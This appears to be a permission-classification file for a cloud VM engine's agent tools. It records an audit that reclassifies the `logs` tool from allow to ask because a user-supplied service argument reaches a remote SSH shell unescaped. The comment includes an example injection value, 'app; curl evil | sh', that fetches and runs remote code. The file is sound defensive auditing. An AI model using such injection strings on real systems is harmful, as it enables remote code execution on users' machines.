$comment: Golden classification of every cloudru-vm engine tool -> permission action. METHOD (corrected 2026-08-10): permission=allow requires a BEHAVIOUR audit of the tool's engine handler (read the handle* in engine/internal/mcp at pinned baseline engineSha256) proving it passes BOTH hazard axes. AXIS 1 (read-only): genuinely read-only — no persistent state write (except a LOCAL plan file, noted per-entry), no downstream s.callTool, no job advancement, no secret material returned. AXIS 2 (SHELL-REACH, added AM-2 2026-08-10, cross-model QE HIGH): the handler does NOT pass any user-controlled argument into a shell/exec/SSH command (Deployer.Exec, session.CombinedOutput, a string-concatenated `docker …/kubectl …/compose …` command, or exec.Command). A tool that reaches a shell with a user arg is `ask` at MINIMUM — the brake can only set the permission, it CANNOT escape the arg (that is the engine's bug, not something the classifier can fix). The former shape heuristic ('no confirmed prop in schema => read-only') was FALSE-SAFE: stack_status had no confirmed prop yet advances jobs and invokes paid create tools (AXIS 1); `logs` was `allow` yet concatenates its user `service` arg RAW into a remote `docker compose logs <service>` over SSH — a command-injection/RCE path (AXIS 2, engine/logs.go:61 → ssh.go:117). Schema shape (confirmed prop) remains sufficient evidence for ask, never for allow. ENGINE INJECTION FLAGGED to the author (licence-blocked, NOT fixed here — see ADR-004 AM-2): the engine must shell-escape opts.Service and audit every `cmd +=` concatenation. Re-audit of ALL current allow tools against AXIS 2 found `logs` the ONLY shell-reaching allow tool; every other shell site (vm_exec, deploy, deploy_apply/captainkeys, k8s_kubectl/k8s_apply/k8s_helm) is already ask, and k8s_kubectl is additionally veto-hooked. Reclassifying a tool must show up in this diff (ADR-010 golden-snapshot discipline). A tool present in a live tools/list but absent here MUST fail the drift test — deny-by-default.

logs.why: RECLASSIFIED allow→ask 2026-08-10 (AM-2, shell-reach hazard axis, cross-model QE HIGH): NOT read-only in the safe sense. handleLogs (tools.go:1758) passes the user-controlled `service` arg into engine.Logs, which CONCATENATES it RAW/unescaped into a remote shell command — `cmd += " " + opts.Service` (engine/logs.go:61) → e.Deployer.Exec (logs.go:64) → SSH session.CombinedOutput (internal/deploy/ssh.go:117). So service="app; curl evil | sh" executes arbitrary commands on the user's VM: a command-injection/RCE path behind a silent allow, defeating the ADR-004 brake for an autonomous agent with cloud creds. The permission layer can only PROMPT; it cannot escape the arg (that is the engine's bug — flagged ADR-004 AM-2, licence-blocked). The prior audit's claim of a "FIXED docker compose logs" was WRONG: the command is NOT fixed.
